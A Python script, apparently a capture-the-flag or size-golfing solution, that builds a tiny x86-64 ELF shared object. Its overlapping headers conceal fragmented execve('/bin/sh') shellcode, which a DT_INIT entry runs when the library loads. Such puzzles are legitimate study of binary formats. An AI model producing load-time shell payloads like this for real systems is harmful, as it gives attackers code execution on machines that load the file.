import io
import struct
import sys

def p16(v):
    return struct.pack('<H',v)
def p32(v):
    return struct.pack('<I',v)
def p64(v):
    return struct.pack('<Q',v)

### original shellcode
#shellcode = b"\x00\x10\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x89\x3E\x6A\x3B\x58\x99\x0F\x05"
### overlapse end of phdr header + 6 last bytes of shellcode
shellcode = b"\x00\x10"+b"\x6a\x3b\x58\x99\x0f\x05"

NB_PH = 2
NB_DYNAMIC_ENTRIES = 3

SIZE_HDR = 0x40 - 0x6 # 6 bytes overlapsed
SIZE_PHT = NB_PH* 0x38 - 0x8*1
SIZE_DYNAMIC = NB_DYNAMIC_ENTRIES * 16  - 8 - 16 # 8 + 16 bytes overlapsed
SIZE_PGM=len(shellcode) 

OFFSET_DYNAMIC = SIZE_HDR 
OFFSET_PHT = OFFSET_DYNAMIC + SIZE_DYNAMIC
OFFSET_PGM = OFFSET_PHT + SIZE_PHT - 24 # shellcode start on unused bytes

WHOLE_SIZE = SIZE_HDR + SIZE_PHT + SIZE_DYNAMIC + SIZE_PGM

ELF_HEADER = io.BytesIO()
magic =  b"\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
ELF_HEADER.write(magic)

etype = b"\x03\x00" #ET_DYN
ELF_HEADER.write(etype)

emachine = b"\x3e\x00" 
ELF_HEADER.write(emachine)

eversion = b"\x01\x00\x00\x00"
ELF_HEADER.write(eversion)

eentry = p64(OFFSET_PGM) 
ELF_HEADER.write(eentry)

ephoff = p64(OFFSET_PHT)
ELF_HEADER.write(ephoff)

eshoff = p64(0)
ELF_HEADER.write(eshoff)

e_flags = p32(0)
ELF_HEADER.write(e_flags)

e_ehsize = p16(SIZE_HDR)
ELF_HEADER.write(e_ehsize)

e_phentsize = p16(0x38)
ELF_HEADER.write(e_phentsize)

e_phnum = p16(NB_PH)
ELF_HEADER.write(e_phnum)

### 6 bytes unused, overlapsed by DYN
#e_shentsize = p16(0x0)
#e_shnum= p16(0)
#e_shstrndx = p16(0)


# DYN
dyn = io.BytesIO()
### those 6 first bytes overlapse the end of ELF header
dyn.write(p64(0xc) + p64(OFFSET_PGM)) #DT_INIT
dyn.write(p64(6))  ### +8 bytes overlapsed by p32(2) and p32(7)
                   ### +16 bytes overlapsed by p64(5) and p64(OFFSET_DYNAMIC)

# PHDR
phdr = io.BytesIO()
# DYNAMIC
### overlapse 8 bytes of DYN
phdr.write(p32(2)) #type DYNAMIC
phdr.write(p32(7)) #flag 
###

### overlapse 16 bytes of DYN
phdr.write(p64(5))              #file offset
phdr.write(p64(OFFSET_DYNAMIC)) #v offset
###

phdr.write(p64(0x4aeb3e8948e78948)) ### middle of shellcode + jmp to last part of shellcode
phdr.write(p64(SIZE_DYNAMIC)) #  Size in file image
phdr.write(p64(SIZE_DYNAMIC)) #  Size in memory image
phdr.write(p64(0x1000)) #  align

# LOAD
phdr.write(p32(1)) #type LOAD
phdr.write(p32(7)) #flag read + exec
phdr.write(p64(0)) #file offset
phdr.write(p64(0)) #v offset
phdr.write(p64(0x6e69622fbf481000)) #p offset             ### beginning of shellcode
phdr.write(p64(0x90b9eb570068732f)) #  Size in file image ### shellcode + jmp back
phdr.write(p64(WHOLE_SIZE)) #  Size in memory image
# 8 bytes of phdr overlapsed by bytes of shellcode

pgm = shellcode

total = io.BytesIO()
total.write(ELF_HEADER.getvalue())
total.write(dyn.getvalue())
total.write(phdr.getvalue())
total.write(pgm)

small = open('elf-golf.so', 'wb')
small.write(total.getvalue())

